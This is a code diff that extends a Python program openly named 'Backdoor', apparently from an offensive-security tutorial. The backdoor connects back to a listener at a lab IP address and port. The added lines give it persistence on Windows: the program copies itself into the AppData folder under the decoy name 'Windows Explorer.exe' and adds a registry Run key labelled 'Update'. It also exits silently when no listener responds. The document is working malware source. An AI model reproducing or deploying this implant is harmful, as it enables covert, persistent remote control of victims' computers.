@@ -6,12 +6,20 @@ import os  # https://docs.python.org/3/library/os.html
 import socket  # https://docs.python.org/3/library/socket.html
 import subprocess  # https://docs.python.org/3/library/subprocess.html
 import sys  # https://docs.python.org/3/library/sys.html
+import shutil  # https://docs.python.org/3/library/shutil.html
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         # Serialisation
@@ -70,5 +78,9 @@ class Backdoor:
 
 # Main
 if __name__ == "__main__":
-    my_backdoor = Backdoor("192.168.122.108", 4444)
-    my_backdoor.run()
+    try:
+        my_backdoor = Backdoor("192.168.122.108", 4444)
+        my_backdoor.run()
+    # If no listener, exit silently
+    except Exception:
+        sys.exit()
